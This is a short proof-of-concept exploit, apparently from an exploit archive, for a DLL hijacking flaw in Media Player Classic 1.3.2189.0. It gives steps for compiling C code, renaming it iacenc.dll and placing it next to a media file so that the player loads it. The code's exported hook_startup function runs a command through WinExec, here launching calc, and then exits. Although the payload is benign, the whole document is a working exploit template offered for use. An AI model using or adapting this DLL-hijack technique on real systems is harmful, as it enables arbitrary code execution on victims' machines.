/*
Mediaplayer Classic 1.3.2189.0 Dll Hijack Exploit
By: Encrypt3d.M!nd
Date: 25\8\2010
Download: http://mpc-hc.sourceforge.net/

Details:
Compile the following code and rename it to iacenc.dll
and place file with one of the affected types in the same directory of the dll

Affected types: m2ts, m2t, flv, hdmov, 3gpp,3gp, mpeg, mp4v, mkv, m2v,rm , ram
(i guess all file types that mpc supports are affected)

Code :(used the one from this advisory:http://www.exploit-db.com/exploits/14758/):
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void hook_startup() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

// POC: http://www.exploit-db.com/sploits/mpc-poc.zip
